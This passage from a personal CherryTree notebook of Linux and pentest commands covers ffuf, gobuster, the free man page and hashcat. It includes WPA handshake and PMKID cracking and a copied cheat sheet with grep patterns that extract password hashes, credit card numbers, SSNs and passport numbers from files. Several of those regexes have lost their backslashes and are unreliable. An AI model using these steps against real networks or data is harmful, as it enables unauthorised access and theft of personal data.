          <rich_text foreground="#6262a0a0eaea">    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c</rich_text>
          <rich_text>

  More information and examples: https://github.com/ffuf/ffuf</rich_text>
        </node>
      </node>
      <node name="fg" unique_id="387" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728552617" ts_lastsave="1728552617"/>
      <node name="figlet" unique_id="235" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684441073" ts_lastsave="1684441098">
        <rich_text>$ figlet MKING       
 __  __ _  _____ _   _  ____ 
|  \/  | |/ /_ _| \ | |/ ___|
| |\/| | ' / | ||  \| | |  _ 
| |  | | . \ | || |\  | |_| |
|_|  |_|_|\_\___|_| \_|\____|
                             
</rich_text>
      </node>
      <node name="file" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285098" ts_lastsave="1684285101"/>
      <node name="find" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285168" ts_lastsave="1684285176"/>
      <node name="finger" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285000" ts_lastsave="1684285003"/>
      <node name="fping" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284076" ts_lastsave="1684284093"/>
      <node name="free" unique_id="164" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285479" ts_lastsave="1724285989">
        <rich_text scale="h1" weight="heavy">$ free</rich_text>
        <rich_text>

Usage:
free [options]

$ whatis
free (1)             - Display amount of free and used memory in the system
free (3)             - allocate and free dynamic memory


</rich_text>
        <node name="help" unique_id="324" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724285612" ts_lastsave="1724285623">
          <rich_text>Usage:
 free [options]

Options:
 -b, --bytes         show output in bytes
     --kilo          show output in kilobytes
     --mega          show output in megabytes
     --giga          show output in gigabytes
     --tera          show output in terabytes
     --peta          show output in petabytes
 -k, --kibi          show output in kibibytes
 -m, --mebi          show output in mebibytes
 -g, --gibi          show output in gibibytes
     --tebi          show output in tebibytes
     --pebi          show output in pebibytes
 -h, --human         show human-readable output
     --si            use powers of 1000 not 1024
 -l, --lohi          show detailed low and high memory statistics
 -L, --line          show output on a single line
 -t, --total         show total for RAM + swap
 -v, --committed     show committed memory and commit limit
 -s N, --seconds N   repeat printing every N seconds
 -c N, --count N     repeat printing N times, then exit
 -w, --wide          wide output

     --help     display this help and exit
 -V, --version  output version information and exit
</rich_text>
        </node>
        <node name="man" unique_id="325" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724285762" ts_lastsave="1724285924">
          <rich_text scale="h1" weight="heavy">User Commands</rich_text>
          <rich_text>

NAME
       free - Display amount of free and used memory in the system

SYNOPSIS
       free [options]

DESCRIPTION
       free displays the total amount of free and used physical and swap memory in the system, as well as the buffers and caches used by the kernel. The informa‐
       tion is gathered by parsing /proc/meminfo. The displayed columns are:

       total  Total  usable memory (MemTotal and SwapTotal in /proc/meminfo). This includes the physical and swap memory minus a few reserved bits and kernel bi‐
              nary code.

       used   Used or unavailable memory (calculated as total - available)

       free   Unused memory (MemFree and SwapFree in /proc/meminfo)

       shared Memory used (mostly) by tmpfs (Shmem in /proc/meminfo)

       buffers
              Memory used by kernel buffers (Buffers in /proc/meminfo)

       cache  Memory used by the page cache and slabs (Cached and SReclaimable in /proc/meminfo)

       buff/cache
              Sum of buffers and cache

       available
              Estimation of how much memory is available for starting new applications, without swapping. Unlike the data provided by the cache or  free  fields,
              this  field  takes into account page cache and also that not all reclaimable memory slabs will be reclaimed due to items being in use (MemAvailable
              in /proc/meminfo, available on kernels 3.14, emulated on kernels 2.6.27+, otherwise the same as free)

OPTIONS
       -b, --bytes
              Display the amount of memory in bytes.

       -k, --kibi
              Display the amount of memory in kibibytes.  This is the default.

       -m, --mebi
              Display the amount of memory in mebibytes.

       -g, --gibi
              Display the amount of memory in gibibytes.

       --tebi Display the amount of memory in tebibytes.

       --pebi Display the amount of memory in pebibytes.

       --kilo Display the amount of memory in kilobytes. Implies --si.

       --mega Display the amount of memory in megabytes. Implies --si.

       --giga Display the amount of memory in gigabytes. Implies --si.

       --tera Display the amount of memory in terabytes. Implies --si.

       --peta Display the amount of memory in petabytes. Implies --si.

       -h, --human
              Show all output fields automatically scaled to shortest three digit unit and display the units of print out.  Following units are used.

                B = bytes
                Ki = kibibyte
                Mi = mebibyte
                Gi = gibibyte
                Ti = tebibyte
                Pi = pebibyte

              If unit is missing, and you have exbibyte of RAM or swap, the number is in tebibytes and columns might not be aligned with header.

       -w, --wide
              Switch to the wide mode. The wide mode produces lines longer than 80 characters. In this mode buffers  and  cache  are  reported  in  two  separate
              columns.

       -c, --count count
              Display the result count times.  Requires the -s option.

       -l, --lohi
              Show detailed low and high memory statistics.

       -L, --line
              Show output on a single line, often used with the -s option to show memory statistics repeatedly.

       -s, --seconds delay
              Continuously display the result delay  seconds apart.  You may actually specify any floating point number for delay using either . or , for decimal
              point.  usleep(3) is used for microsecond resolution delay times.

       --si   Use kilo, mega, giga etc (power of 1000) instead of kibi, mebi, gibi (power of 1024).

       -t, --total
              Display a line showing the column totals.

       -v, --committed
              Display  a  line  showing the memory commit limit and amount of committed/uncommitted memory. The total column on this line will display the memory
              commit limit.   This line is relevant if memory overcommit is disabled.

       --help Print help.

       -V, --version
              Display version information.

FILES
       /proc/meminfo
              memory information

BUGS
       The value for the shared column is not available from kernels before 2.6.32 and is displayed as zero.

       Please send bug reports to
              procps@freelists.org

SEE ALSO
       ps(1), slabtop(1), top(1), vmstat(8).

procps-ng
2023-05-02 </rich_text>
        </node>
      </node>
      <node name="gcc" unique_id="252" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685974002" ts_lastsave="1728900744">
        <rich_text scale="h1" weight="heavy">make an executable version of C file.</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#3333d1d17a7a">gcc</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> xxxxx.c </rich_text>
        <rich_text foreground="#3333d1d17a7a">-o</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> exec </rich_text>
        <rich_text foreground="#3333d1d17a7a">-lcrypto</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">gcc</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">xxxxx.c</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#3333d1d17a7a">-o</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">exec</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#3333d1d17a7a">-lcrypto</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#3333d1d17a7a">-L/usr/local/ssl/lib -lssl</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="gen" unique_id="275" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687162995" ts_lastsave="1687163014">
        <node name="maskgen" unique_id="276" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687163014" ts_lastsave="1687163017">
          <rich_text>$ maskgen</rich_text>
        </node>
        <node name="statgen" unique_id="274" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687160659" ts_lastsave="1687163006">
          <rich_text>$ statsgen</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283399" ts_lastsave="1730105101">
        <rich_text scale="h1" weight="heavy">$ gobuster</rich_text>
        <rich_text>
gobuster (1)         - Directory/file &amp; DNS busting tool written in Go
 


</rich_text>
        <rich_text scale="h3" weight="heavy">Example:</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ gobuster </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">dir -u</rich_text>
        <rich_text> http://example.com</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> -w</rich_text>
        <rich_text> wordlist.txt
</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ gobuster</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> dir -u</rich_text>
        <rich_text> http://example.com </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-w</rich_text>
        <rich_text> wordlist.txt </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-x</rich_text>
        <rich_text> html,txt,php </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-o</rich_text>
        <rich_text> output.log

</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ gobuster</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">dns</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-d</rich_text>
        <rich_text> example.com </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-w</rich_text>
        <rich_text> wordlist.txt</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> -t</rich_text>
        <rich_text> 100</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> -v</rich_text>
        <node name="help" unique_id="400" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729187957" ts_lastsave="1730105181">
          <rich_text>Usage:
  gobuster [command]

Available Commands:
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">completion</rich_text>
          <rich_text>  Generate the autocompletion script for the specified shell
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">dir</rich_text>
          <rich_text>         Uses directory/file enumeration mode
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">dns</rich_text>
          <rich_text>         Uses DNS subdomain enumeration mode
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">fuzz</rich_text>
          <rich_text>        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">gcs</rich_text>
          <rich_text>         Uses gcs bucket enumeration mode
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">help</rich_text>
          <rich_text>        Help about any command
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">s3</rich_text>
          <rich_text>          Uses aws bucket enumeration mode
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">tftp</rich_text>
          <rich_text>        Uses TFTP enumeration mode
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">version</rich_text>
          <rich_text>     shows the current version
  </rich_text>
          <rich_text foreground="#f9f9f0f06b6b">vhost</rich_text>
          <rich_text>       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)

Flags:
      --debug                 Enable debug output
      --delay duration        Time each thread waits between requests (e.g. 1500ms)
  -h, --help                  help for gobuster
      --no-color              Disable color output
      --no-error              Don't display errors
  -z, --no-progress           Don't display progress
  -o, --output string         Output file to write results to (defaults to stdout)
  -p, --pattern string        File containing replacement patterns
  -q, --quiet                 Don't print the banner and other noise
</rich_text>
          <rich_text foreground="#f6f661615151" weight="heavy">  -t, --threads int           Number of concurrent threads (default 10)
  -v, --verbose               Verbose output (errors)
  -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.</rich_text>
          <rich_text>
      --wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)
 
Use "gobuster [command] --help" for more information about a command.</rich_text>
        </node>
      </node>
      <node name="grep" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285131" ts_lastsave="1684285136"/>
      <node name="groups" unique_id="144" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285323" ts_lastsave="1728275126">
        <rich_text scale="h1" weight="heavy">groups</rich_text>
        <rich_text>


Adding the New User to the Sudo Group
groups &lt;username&gt;</rich_text>
      </node>
      <node name="gzip" unique_id="139" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285299" ts_lastsave="1684285304"/>
      <node name="halt" unique_id="152" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285390" ts_lastsave="1728639240"/>
      <node name="hash-identifier" unique_id="391" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728639240" ts_lastsave="1728639344">
        <rich_text scale="h1" weight="heavy">hash-identifier</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">$ hash-identifier</rich_text>
        <rich_text>
#########################################################################
#     __  __                     __           ______    _____           #
#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
#                                                             By Zion3R #
#                                                    </rich_text>
        <rich_text link="webs http://www.Blackploit.com">www.Blackploit.com</rich_text>
        <rich_text> #
#                                                   Root@Blackploit.com #
#########################################################################
</rich_text>
      </node>
      <node name="hashcat" unique_id="234" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287582" ts_lastsave="1724179509">
        <rich_text scale="h1" weight="heavy">$ hashcat</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...</rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Sample</rich_text>
        <rich_text>
• hashcat -a 0 -m 0 &lt;hash&gt; &lt;wordlist&gt;
   ◇ 0	| Straight
   ◇ 0	| MD5                                                        | Raw Hash

</rich_text>
        <rich_text underline="single" weight="heavy">PMKID</rich_text>
        <rich_text>
• hashcat --quiet -m 22000 -a 0 hs/pmkid.22000 ./my_wordlist.txt --force
   ◇ 22000 	| WPA-PBKDF2-PMKID+EAPOL                                     | Network Protocol
   ◇ 0			| Straight

</rich_text>
        <rich_text underline="single" weight="heavy">4-Way Handshake</rich_text>
        <rich_text>
• hcxpcapngtool -o /tmp/wifitebkdjni_t/generated.hccapx hs/handshake_TaranomNima_28-D1-27-4DE3E0_2023-06-11T16-19-57.cap                                                                      
• hashcat --quiet -m 22000 /tmp/wifitebkdjni_t/generated.hccapx /usr/share/dict/wordlist-probable.txt --force  

</rich_text>
        <node name="CheatSheet" unique_id="316" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724178653" ts_lastsave="1724178956">
          <rich_text scale="h1" weight="heavy"># Cheat-Sheet for password crackers</rich_text>
          <rich_text>

(from hashcat.net)
</rich_text>
          <rich_text link="webs https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers">https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers</rich_text>
          <node name="LIST" unique_id="317" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724178745" ts_lastsave="1724179031">
            <rich_text scale="h2">Extract md5 hashes</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' &gt; md5-hashes.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">An alternative could be with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed -rn 's/.*[^a-fA-F0-9]([a-fA-F0-9]{32})[^a-fA-F0-9].*/1/p' *.txt &gt; md5-hashes</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3" weight="heavy">Note:</rich_text>
            <rich_text scale="h3"> The above regexes can be used for SHA1, SHA256 and other unsalted hashes represented in hex. The only thing you have to do is change the '{32}' to the corresponding length for your desired hash-type.</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract valid MySQL-Old hashes</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt &gt; mysql-old-hashes.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract blowfish hashes</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -e "$2a\$\08\$(.){75}" *.txt &gt; blowfish-hashes.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract Joomla hashes</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt &gt; joomla.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract VBulletin hashes</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt &gt; vbulletin.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extraxt phpBB3-MD5</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o '$H$S{31}' *.txt &gt; phpBB3-md5.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract Wordpress-MD5</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o '$P$S{31}' *.txt &gt; wordpress-md5.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract Drupal 7</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o '$S$S{52}' *.txt &gt; drupal-7.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract old Unix-md5</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o '$1$w{8}S{22}' *.txt &gt; md5-unix-old.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract md5-apr1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o '$apr1$w{8}S{22}' *.txt &gt; md5-apr1.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract sha512crypt, SHA512(Unix)</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -o '$6$w{8}S{86}' *.txt &gt; sha512crypt.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract e-mails from text files</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt &gt; e-mails.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract HTTP URLs from text files</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep http | grep -shoP 'http.*?[" &gt;]' *.txt &gt; http-urls.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">For extracting HTTPS, FTP and other URL format use </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E '(((https|ftp|gopher)|mailto)[.:][^ &gt;" ]*|www.[-a-z0-9.]+)[^ .,; &gt;"&gt;):]' *.txt &gt; urls.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3" weight="heavy">Note:</rich_text>
            <rich_text scale="h3"> if grep returns "Binary file (standard input) matches" use the following approaches </rich_text>
            <rich_text family="monospace" scale="h3"># tr '[\000-\011\013-\037177-377]' '.' &lt; *.log | grep -E "Your_Regex"</rich_text>
            <rich_text scale="h3"> OR </rich_text>
            <rich_text family="monospace" scale="h3"># cat -v *.log | egrep -o "Your_Regex"</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract Floating point numbers</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt &gt; floats.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract credit card data</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">Visa </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt &gt; visa.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">MasterCard </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt &gt; mastercard.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">American Express </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "\b3[47][0-9]{13}\b" *.txt &gt; american-express.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">Diners Club </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt &gt; diners.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">Discover </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt &gt; discover.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">JCB </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt &gt; jcb.txt</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">AMEX </rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt &gt; amex.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract Social Security Number (SSN)</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt &gt; ssn.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract Indiana Driver License Number</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt &gt; indiana-dln.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract US Passport Cards</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "C0[0-9]{7}" *.txt &gt; us-pass-card.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract US Passport Number</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -E -o "[23][0-9]{8}" *.txt &gt; us-pass-num.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract US Phone Numberss</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt &gt; us-phones.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Extract ISBN Numbers</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt &gt; isbn.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h1">WordList Manipulation</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Remove the space character with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed -i 's/ //g' file.txt</rich_text>
            <rich_text scale="h3"> OR </rich_text>
            <rich_text family="monospace" scale="h3"># egrep -v "^[[:space:]]*$" file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Remove the last space character with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed -i s/.$// file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Sorting Wordlists by Length</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># awk '{print length, $0}' rockyou.txt | sort -n | cut -d " " -f2- &gt; rockyou_length-list.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Convert uppercase to lowercase and the opposite</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace"># tr [A-Z] [a-z] &lt; file.txt &gt; lower-case.txt
# tr [a-z] [A-Z] &lt; file.txt &gt; upper-case.txt
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">Remove blank lines with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed -i '/^$/d' List.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Remove defined character with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed -i "s/'//" file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Delete a string with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># echo 'This is a foo test' | sed -e 's/&lt;foo&gt;//g'</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Replace characters with tr</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># tr '@' '#' &lt; emails.txt</rich_text>
            <rich_text scale="h3"> OR </rich_text>
            <rich_text family="monospace" scale="h3"># sed 's/@/#' file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Print specific columns with awk</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># awk -F "," '{print $3}' infile.csv &gt; outfile.csv</rich_text>
            <rich_text scale="h3"> OR </rich_text>
            <rich_text family="monospace" scale="h3"># cut -d "," -f 3 infile.csv &gt; outfile.csv</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3" weight="heavy">Note:</rich_text>
            <rich_text scale="h3"> if you want to isolate all columns after column 3 use </rich_text>
            <rich_text family="monospace" scale="h3"># cut -d "," -f 3- infile.csv &gt; outfile.csv</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Generate Random Passwords with urandom</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace"># tr -dc 'a-zA-Z0-9._!@#$%^&amp;*()' &lt; /dev/urandom | fold -w 8 | head -n 500000 &gt; wordlist.txt
# tr -dc 'a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=' &lt; /dev/urandom | fold -w 12 | head -n 4
# base64 /dev/urandom | tr -d '[^:alnum:]' | cut -c1-10 | head -2
# tr -dc 'a-zA-Z0-9' &lt; /dev/urandom | fold -w 10 | head -n 4
# tr -dc 'a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=' &lt; /dev/urandom | fold -w 12 | head -n 4 | grep -i '[!@#$%^&amp;*()_+{}|:&lt;&gt;?=]'
# tr -dc '[:print:]' &lt; /dev/urandom | fold -w 10| head -n 10
# tr -cd '[:alnum:]' &lt; /dev/urandom | fold -w30 | head -n2
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">Remove Parenthesis with tr</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># tr -d '()' &lt; in_file &gt; out_file</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Generate wordlists from your file-names</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># ls -A | sed 's/regexp/&amp; /g'</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Process text files when cat is unable to handle strange characters</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed 's/([[:alnum:]]*)[[:space:]]*(.)(..*)/12/' *.txt</rich_text>
            <rich_text>

